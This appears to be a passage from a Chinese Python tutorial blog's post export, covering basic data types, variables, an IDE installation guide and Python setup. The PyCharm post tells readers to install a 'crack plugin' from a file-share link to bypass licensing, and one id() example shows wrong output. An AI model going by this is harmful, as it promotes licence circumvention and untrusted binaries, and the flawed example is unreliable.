class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">price = <span class="number">98.88</span></span><br><span class="line"></span><br><span class="line">money = <span class="number">3999.54</span></span><br></pre></td></tr></table></figure><h3 id="1-3-数字类型的使用"><a href="#1-3-数字类型的使用" class="headerlink" title="1.3 数字类型的使用"></a>1.3 数字类型的使用</h3><h4 id="1-3-1-数学运算"><a href="#1-3-1-数学运算" class="headerlink" title="1.3.1 数学运算"></a>1.3.1 数学运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">99</span></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 100</span></span><br></pre></td></tr></table></figure><h4 id="1-3-2-比较大小"><a href="#1-3-2-比较大小" class="headerlink" title="1.3.2 比较大小"></a>1.3.2 比较大小</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">100</span></span><br><span class="line">y = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y&gt;x) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p>顺便提一嘴, float类型 可以和 int类型 做四则运算 结果都是 float类型 </p><p>注意:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">99.99</span></span><br><span class="line">y = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x+y) <span class="comment"># 100.00</span></span><br><span class="line"><span class="comment"># x + y == 100 False</span></span><br></pre></td></tr></table></figure><h2 id="2-字符串类型"><a href="#2-字符串类型" class="headerlink" title="2. 字符串类型"></a>2. 字符串类型</h2><h3 id="2-1-字符"><a href="#2-1-字符" class="headerlink" title="2.1 字符"></a>2.1 字符</h3><h4 id="2-1-1-什么是字符"><a href="#2-1-1-什么是字符" class="headerlink" title="2.1.1 什么是字符"></a>2.1.1 什么是字符</h4><p>字符是组成内容的最小单位, 比如’hello’ 他就是由5个英文字符组成的一个字符串,字符不只限于英文字符, 中文字符,数字字符都是字符.</p><h3 id="2-2-字符串"><a href="#2-2-字符串" class="headerlink" title="2.2 字符串"></a>2.2 字符串</h3><h4 id="2-2-1-什么是字符串"><a href="#2-2-1-什么是字符串" class="headerlink" title="2.2.1 什么是字符串"></a>2.2.1 什么是字符串</h4><p>字符串就是由许多字符组成的一串内容   ‘h’</p><h4 id="2-2-2-作用"><a href="#2-2-2-作用" class="headerlink" title="2.2.2 作用"></a>2.2.2 作用</h4><p>字符串的作用是用来记录描述性质的状态</p><h4 id="2-2-3-定义字符串"><a href="#2-2-3-定义字符串" class="headerlink" title="2.2.3 定义字符串"></a>2.2.3 定义字符串</h4><p>用英文引号 （单引号、双引号、三引号）包含的一串字符。</p><ul><li><p>通过单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;alex&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>通过双引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="string">&quot;18&quot;</span>  <span class="comment"># 注意这里是用引号包裹的,不是int类型,是str类型</span></span><br></pre></td></tr></table></figure></li><li><p>通过三引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hobby = <span class="string">&quot;&quot;&quot; 喝酒,抽烟</span></span><br><span class="line"><span class="string">烫头发 &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p>单双引号没什么区别, 三引号有些特殊,可以支持换行输出</p><h4 id="2-2-4-字符串的嵌套"><a href="#2-2-4-字符串的嵌套" class="headerlink" title="2.2.4 字符串的嵌套"></a>2.2.4 字符串的嵌套</h4><p>注意: 字符串的嵌套只能发生在不同种引号之间，双引号嵌套单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;你好,我叫&#x27;山鸡&#x27;, 你也可以叫我小鸡 , 初次见面,多多关照&quot;</span> <span class="comment"># 双引号嵌套单引号</span></span><br></pre></td></tr></table></figure><p>字符串也可以<code>用+号连接</code>,但是不称之为是字符串相加 , 称它是字符串的拼接,只限于字符串和字符串 (效率低)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello &#x27;</span></span><br><span class="line">y = <span class="string">&#x27;word&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x + y) <span class="comment"># hello word</span></span><br></pre></td></tr></table></figure><p>字符串也可以和int类型用<code>*</code>号连接, 代表复制字符串int份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;alex sb&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s*<span class="number">3</span>) <span class="comment"># &#x27;alex sbalex sbalex sb&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3-列表类型"><a href="#3-列表类型" class="headerlink" title="3. 列表类型"></a>3. 列表类型</h2><h3 id="3-1-什么是列表"><a href="#3-1-什么是列表" class="headerlink" title="3.1 什么是列表"></a>3.1 什么是列表</h3><p>你可以把列表理解成一种容器 , 容器里面可以放很多值. 有人可能会说, 我字符串也可以放很多值啊, 为什么还要用列表呢? 我们都知道他们两个都可以存放很多值, 但是我们要知道, 值不单单只有存, 还要有取, 换句话来说, 你存值就肯定会取值, 如果你不取, 那存值将毫无意义. 列表相对于字符串的优点就是取值方便, 更利于我们操作.</p><p>列表是通过索引对应值, 索引从0开始, 0代表第一个.</p><h3 id="3-2-作用"><a href="#3-2-作用" class="headerlink" title="3.2 作用"></a>3.2 作用</h3><p>记录多个值 , 并且可以按照索引取到指定位置的值</p><h3 id="3-3-定义"><a href="#3-3-定义" class="headerlink" title="3.3 定义"></a>3.3 定义</h3><p>在 [ ] 内用逗号分隔开多个任意类型的值 , 每一个值称之为一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span> ]</span><br><span class="line">索引:     <span class="number">0</span>    <span class="number">1</span>    <span class="number">2</span></span><br></pre></td></tr></table></figure><p>列表也可以嵌套列表,称之为二维列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [ [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>]]</span><br><span class="line">索引             <span class="number">0</span>                  <span class="number">1</span>                     <span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>提一嘴:</strong></p><p>列表在内存中的存储方式（基本上容器类型的数据都是这样在内存中存储的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;烫头&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="string">&quot;Tom&quot;</span>的内存地址</span><br><span class="line"><span class="number">1</span>:<span class="number">18</span>的内存地址</span><br><span class="line"><span class="number">2</span>:<span class="string">&#x27;烫头&#x27;</span>的内存地址</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200812180634069.png" alt="image-20200812180634069"></p><h2 id="4-字典类型"><a href="#4-字典类型" class="headerlink" title="4. 字典类型"></a>4. 字典类型</h2><h3 id="4-1-什么是字典"><a href="#4-1-什么是字典" class="headerlink" title="4.1 什么是字典"></a>4.1 什么是字典</h3><p>key对应值, 其中key通常为字符串类型, 所以key对值有描述性的功能                    类型：dict</p><p>字典是无序的, 虽然你在pycharm中打印的结果虽然每次都一样, 在python中交互式中写代码也是,但是我们仍然把字典看成无序的,或者你这样理解,有序就有索引,就可以通过索引取值,但是字典不能通过索引取值,所以是无序的.</p><h3 id="4-2-作用"><a href="#4-2-作用" class="headerlink" title="4.2 作用"></a>4.2 作用</h3><p>用来存多个值, 每一个值都有一个唯一的key与其对应</p><h3 id="4-3-定义"><a href="#4-3-定义" class="headerlink" title="4.3 定义"></a>4.3 定义</h3><p>在 { } 内用逗号分隔开多个 key :  value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;alex&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="5-布尔类型"><a href="#5-布尔类型" class="headerlink" title="5. 布尔类型"></a>5. 布尔类型</h2><h3 id="5-1-作用"><a href="#5-1-作用" class="headerlink" title="5.1 作用"></a>5.1 作用</h3><p>用来记录真假的状态, 通常用来当做判断的条件</p><h3 id="5-2-定义"><a href="#5-2-定义" class="headerlink" title="5.2 定义"></a>5.2 定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_ok = <span class="literal">True</span>  <span class="comment">#真</span></span><br><span class="line">is_ok = <span class="literal">False</span> <span class="comment">#假</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注释&amp;变量&amp;常量</title>
      <link href="/2023/04/02/%E5%8F%98%E9%87%8F&amp;%E5%B8%B8%E9%87%8F&amp;%E6%B3%A8%E9%87%8A/"/>
      <url>/2023/04/02/%E5%8F%98%E9%87%8F&amp;%E5%B8%B8%E9%87%8F&amp;%E6%B3%A8%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="注释-amp-变量-amp-常量"><a href="#注释-amp-变量-amp-常量" class="headerlink" title="注释&amp;变量&amp;常量"></a>注释&amp;变量&amp;常量</h2><h3 id="1-注释"><a href="#1-注释" class="headerlink" title="1.注释"></a>1.注释</h3><p>注释是对代码的解释说明，不是所有代码都需要注释，只是那些难于理解又关键的代码，必须加注释，方便自己或</p><p>其他人后期阅读。</p><p>注释的内容不会被python解释器，解释执行。</p><h4 id="1-1-注释的两种方式"><a href="#1-1-注释的两种方式" class="headerlink" title="1.1 注释的两种方式"></a>1.1 注释的两种方式</h4><p><strong>1.1.1 单行注释</strong></p><p>井号 + 注释内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我是一行注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello word&#x27;</span>)    <span class="comment"># 我也是一行注释</span></span><br></pre></td></tr></table></figure><p><strong>1.1.2 多行注释</strong></p><p>三个单引号&#x2F;三个双引号  +  注释内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我是</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我也是</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2. 变量"></a>2. 变量</h3><h4 id="2-1-什么是变量？"><a href="#2-1-什么是变量？" class="headerlink" title="2.1 什么是变量？"></a>2.1 什么是变量？</h4><p>变量就是可以变化的量，这个量指的是事物的状态，比如说人的年龄，今天的天气啊，你的发量啊，哈哈哈。</p><p>在计算机中变量指的是 内存中的一段空间</p><h4 id="2-2-为什么要有变量？"><a href="#2-2-为什么要有变量？" class="headerlink" title="2.2 为什么要有变量？"></a>2.2 为什么要有变量？</h4><p>为了让计算机能够像人一样去记忆事物的某种状态，并且状态是可以发生变化的。</p><p>详细地说：</p><p>程序执行的本质就是一系列状态的变化，变化是程序执行的直接体现，所以我们需要有一种机制能够反映或者说是</p><p>保存下来程序执行时状态，以及状态的变化。</p><h4 id="2-3-怎么使用变量？"><a href="#2-3-怎么使用变量？" class="headerlink" title="2.3 怎么使用变量？"></a>2.3 怎么使用变量？</h4><p><strong>变量一定是，先定义后使用。</strong></p><p>变量的三大组成部分，如下图</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200803210523860.png" alt="image-20200803210523860"></p><p>解释器执行到变量定义的代码时会申请内存空间存放变量值，然后将变量值的内存地址绑定给变量名，以变量的定</p><p>义name &#x3D; “mhx”为例，如下图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个变量</span></span><br><span class="line">name = <span class="string">&quot;mhx&quot;</span></span><br></pre></td></tr></table></figure><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200803211316599.png" alt="image-20200803211316599" style="zoom:80%;" /><p>这样我们就定义了一个变量，定义变量的本质就是申请在内存中开辟一块空间存放变量值，那之前我们说过，你既</p><p>然存在内存中，怎么取出来用呢？就是通过变量名，变量名指向的就是变量值存放的内存地址，我们可以拿着地址</p><p>去访问值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个变量</span></span><br><span class="line">name = <span class="string">&quot;ymn&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><h4 id="2-4-变量名的命名规范"><a href="#2-4-变量名的命名规范" class="headerlink" title="2.4 变量名的命名规范"></a>2.4 变量名的命名规范</h4><ul><li><p>变量名只能由 字母、数字、下划线 组成。</p></li><li><p>变量名不能以数字开头。</p></li><li><p>变量名不能是Python内置关键字，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‘<span class="keyword">and</span>’, ‘<span class="keyword">as</span>’, ‘<span class="keyword">assert</span>’, ‘<span class="keyword">break</span>’, ‘<span class="keyword">class</span>’, ‘<span class="keyword">continue</span>’, ‘<span class="keyword">def</span>’, ‘<span class="keyword">del</span>’, ‘<span class="keyword">elif</span>’, ‘<span class="keyword">else</span>’, ‘<span class="keyword">except</span>’, ‘<span class="built_in">exec</span>’, ‘<span class="keyword">finally</span>’, ‘<span class="keyword">for</span>’, ‘<span class="keyword">from</span>’, ‘<span class="keyword">global</span>’, ‘<span class="keyword">if</span>’, ‘<span class="keyword">import</span>’, ‘<span class="keyword">in</span>’, ‘<span class="keyword">is</span>’, ‘<span class="keyword">lambda</span>’, ‘<span class="keyword">not</span>’, ‘<span class="keyword">or</span>’, ‘<span class="keyword">pass</span>’, ‘<span class="built_in">print</span>’, ‘<span class="keyword">raise</span>’, ‘<span class="keyword">return</span>’, ‘<span class="keyword">try</span>’, ‘<span class="keyword">while</span>’, ‘<span class="keyword">with</span>’, ‘<span class="keyword">yield</span>’</span><br><span class="line"></span><br><span class="line">可以通过</span><br><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)    <span class="comment"># 打印所有的关键字</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>命名的两种风格</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 风格一：驼峰体</span></span><br><span class="line">AgeOfTony = <span class="number">56</span> </span><br><span class="line">NumberOfStudents = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 风格二：纯小写+下划线(在python中，变量名的命名推荐使用该风格)</span></span><br><span class="line">age_of_tony = <span class="number">56</span> </span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">number_of_students = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推荐</span></span><br><span class="line">变量的命名是见名知意</span><br></pre></td></tr></table></figure><p><strong>变量名的不推荐命名</strong>（虽然程序不会报错，但是别人看到这样的命名一定会，呵呵的）</p><ul><li>采用拼音，用汉字命名，变量名过长，这些都是不推荐的，实际开发中，一定不要采用这种。</li></ul><h3 id="3-is-与-x3D-x3D"><a href="#3-is-与-x3D-x3D" class="headerlink" title="3. is 与 &#x3D;&#x3D;"></a>3. is 与 &#x3D;&#x3D;</h3><h4 id="3-1-id"><a href="#3-1-id" class="headerlink" title="3.1 id"></a>3.1 id</h4><p>之前我们讲到过变量名绑定的是变量值的内存地址，那么不同的变量名可能绑定的内存地址是不同的，那么怎么能</p><p>体现这一点呢？python解释器给我们提供了<strong>id（）</strong>这个函数。（函数后面会介绍）</p><p>通过<code>id(变量名)</code> 会返回一串id号码，这串id号码就对应着这个变量值的内存地址。那么我们就可以通过比较id号</p><p>码，来判断不同变量名指向的内存地址是否相同。id( )返回对象当前的内存地址，内存地址不同id自然不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;ymn&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(x))  <span class="comment"># 3102991623032</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(y))  <span class="comment"># 3102991623032</span></span><br></pre></td></tr></table></figure><h4 id="3-2-is"><a href="#3-2-is" class="headerlink" title="3.2 is"></a>3.2 is</h4><p>比较的是左右两边的id是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;100&#x27;</span></span><br><span class="line">y = x</span><br><span class="line"><span class="built_in">print</span>(x <span class="keyword">is</span> y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h4 id="3-3-x3D-x3D"><a href="#3-3-x3D-x3D" class="headerlink" title="3.3 &#x3D;&#x3D;"></a>3.3 &#x3D;&#x3D;</h4><p>比较的是左右两边的值是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x == y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong> id相等，即内存地址必然相等，即值必然相等。但是值相等，但id不一定相等，内存地址也不一定相等。</p><h3 id="4-小整数池-了解"><a href="#4-小整数池-了解" class="headerlink" title="4. 小整数池 ( 了解 )"></a>4. 小整数池 ( 了解 )</h3><h4 id="4-1-什么是小整数池？"><a href="#4-1-什么是小整数池？" class="headerlink" title="4.1 什么是小整数池？"></a>4.1 什么是小整数池？</h4><p>就是当你的python解释器启动的那一刻，会在内存中事先申请好一系列的内存空间存在一些常用的整数。</p><p>这个整数的返回是【-5 , 256】。</p><h4 id="4-2-小整数池有什么用？"><a href="#4-2-小整数池有什么用？" class="headerlink" title="4.2 小整数池有什么用？"></a>4.2 小整数池有什么用？</h4><p>这样一些我们常用的小整数就不需要我们来回创建了，直接从小整数池中取。</p><h3 id="5-常量"><a href="#5-常量" class="headerlink" title="5. 常量"></a>5. 常量</h3><h4 id="5-1-什么是常量？"><a href="#5-1-什么是常量？" class="headerlink" title="5.1 什么是常量？"></a>5.1 什么是常量？</h4><p>常量就是不变的量，但是在python中是没有常量概念的，人们约定俗成用全部大写的英文单词代表常量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NAME = <span class="string">&quot;我是一个常量&quot;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-为什么要有常量？"><a href="#5-2-为什么要有常量？" class="headerlink" title="5.2 为什么要有常量？"></a>5.2 为什么要有常量？</h4><p>在程序运行过程中，有些值是固定的、不应该被改变，比如圆周率 3.141592653…</p><h4 id="5-3-怎么使用常量？"><a href="#5-3-怎么使用常量？" class="headerlink" title="5.3 怎么使用常量？"></a>5.3 怎么使用常量？</h4><p>在Python中没有一个专门的语法定义常量，约定俗成是用全部大写的变量名表示常量。如：PI&#x3D;3.14159。所以单</p><p>从语法层面去讲，常量的使用与变量完全一致。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装pycharm</title>
      <link href="/2023/04/02/pycharm%E7%A0%B4%E8%A7%A3%E6%BF%80%E6%B4%BB/"/>
      <url>/2023/04/02/pycharm%E7%A0%B4%E8%A7%A3%E6%BF%80%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-下载文件"><a href="#1-下载文件" class="headerlink" title="1.下载文件"></a>1.下载文件</h2><p>链接：<a href="https://pan.baidu.com/s/1lzpMIw041W3vGvw4yP6Ixw">https://pan.baidu.com/s/1lzpMIw041W3vGvw4yP6Ixw</a> </p><p>提取码：trno</p><h2 id="2-安装pycharm"><a href="#2-安装pycharm" class="headerlink" title="2.安装pycharm"></a>2.安装pycharm</h2><p>下载好以后 , 双击<code>pycharm.exe</code> 下一步 , 下一步安装就好了 , 安装过程中需要勾选一个</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181031936.png" alt="image-20211023181031936"></p><p>然后打开pycharm </p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181136449.png" alt="image-20211023181136449"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181148518.png" alt="image-20211023181148518"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181203241.png" alt="image-20211023181203241"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181235072.png" alt="image-20211023181235072"></p><h2 id="3-激活"><a href="#3-激活" class="headerlink" title="3.激活"></a>3.激活</h2><p>创建项目</p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205632778-1385222234.png"></p><p>选择项目名和python解释器路径</p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205657979-1918507016.png"></p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205709781-1927743151.png"></p><p>然后进入pycharm , 把解压好的破解插件拖到pycharm中</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181657896.png" alt="image-20211023181657896"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181708947.png" alt="image-20211023181708947"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181723783.png" alt="image-20211023181723783"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181747891.png" alt="image-20211023181747891"></p><h2 id="4-查看激活信息"><a href="#4-查看激活信息" class="headerlink" title="4.查看激活信息"></a>4.查看激活信息</h2><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181840805.png" alt="image-20211023181840805"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181822393.png" alt="image-20211023181822393"></p><p>已经激活到 2089年</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装python和pip换源</title>
      <link href="/2023/04/02/python%E5%AE%89%E8%A3%85%E5%92%8Cpip%E6%8D%A2%E6%BA%90/"/>
      <url>/2023/04/02/python%E5%AE%89%E8%A3%85%E5%92%8Cpip%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="1-windows安装python"><a href="#1-windows安装python" class="headerlink" title="1.windows安装python"></a>1.windows安装python</h2><h3 id="1-1安装python3"><a href="#1-1安装python3" class="headerlink" title="1.1安装python3"></a>1.1安装python3</h3><p>官网下载地址 : <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154252515.png" alt="image-20211023154252515"></p><p>当前python3最先版本已经是python3.10了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154747679.png" alt="image-20211023154747679"></p><p>然后下载完成就是双击安装下一步 , 下一步 , <code>记住你的安装目录</code> , 因为后面添加环境变量会用到 , 不推荐默认安装在c盘</p><p>补充 : 如果你没有科学上网 , 可能会下载的很慢 , 可以去镜像站下载安装包 , 然后是一样的步骤安装</p><p>地址 : <a href="http://npm.taobao.org/mirrors/python/3.9.7/">http://npm.taobao.org/mirrors/python/3.9.7/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023155058523.png" alt="image-20211023155058523"></p><h3 id="1-2安装python2"><a href="#1-2安装python2" class="headerlink" title="1.2安装python2"></a>1.2安装python2</h3><p>关于python2的安装实际上和python3一样 , 只不过下载的安装包不一样</p><p>官网 : <a href="https://www.python.org/downloads/release/python-2718/">https://www.python.org/downloads/release/python-2718/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154638480.png" alt="image-20211023154638480"></p><p>镜像站 : <a href="http://npm.taobao.org/mirrors/python/2.7.9/">http://npm.taobao.org/mirrors/python/2.7.9/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/SI8v2hOVlKxupij.png" alt="image-20211023155247104"></p><h3 id="1-3添加环境变量"><a href="#1-3添加环境变量" class="headerlink" title="1.3添加环境变量"></a>1.3添加环境变量</h3><p>就是把python的<code>安装目录</code>和<code>Script目录</code>添加到<code>path</code>这个系统变量 , 这里为了区分python2和python3 , 可以这样操作</p><p>先把各个版本的<code>python.exe</code>复制然后重命名为<code>python2.exe</code>和<code>python3.exe</code></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/lyS3U1KIHBLkc6r.png" alt="image-20211023160143061"></p><p>按下<code>win</code>键 , 输入环境变量</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172337044.png" alt="image-20211023172337044"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172552047.png" alt="image-20211023172552047"></p><p>然后一路确定就ok了</p><p>验证 :</p><p>win + r , 输入 cmd , 回车 , 输入python2和python3 , 出现下面显示就表示环境变量已经配置好了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172738216.png" alt="image-20211023172738216"></p><p>这里解释一下环境变量，如果你想运行python解释器，那是不是先要找到python解释器的安装目录，然后进入到</p><p>该目录下，输入python，即可运行python.exe这个可执行文件，但是如果我们每次都这样运行的话，岂不是很费</p><p>事，先找目录，然后才能运行。但是如果你在环境变量中配置了python.exe的路径，那么你就可以在任意目录</p><p>下，直接输入python，然后就能执行python.exe文件了。这就是为什么要安装环境变量。</p><h2 id="2-centos安装python"><a href="#2-centos安装python" class="headerlink" title="2.centos安装python"></a>2.centos安装python</h2><p>如果原系统已经存在python3了 , 但是是老版本的 , 你可以先先卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove python3</span><br></pre></td></tr></table></figure><p>手动安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 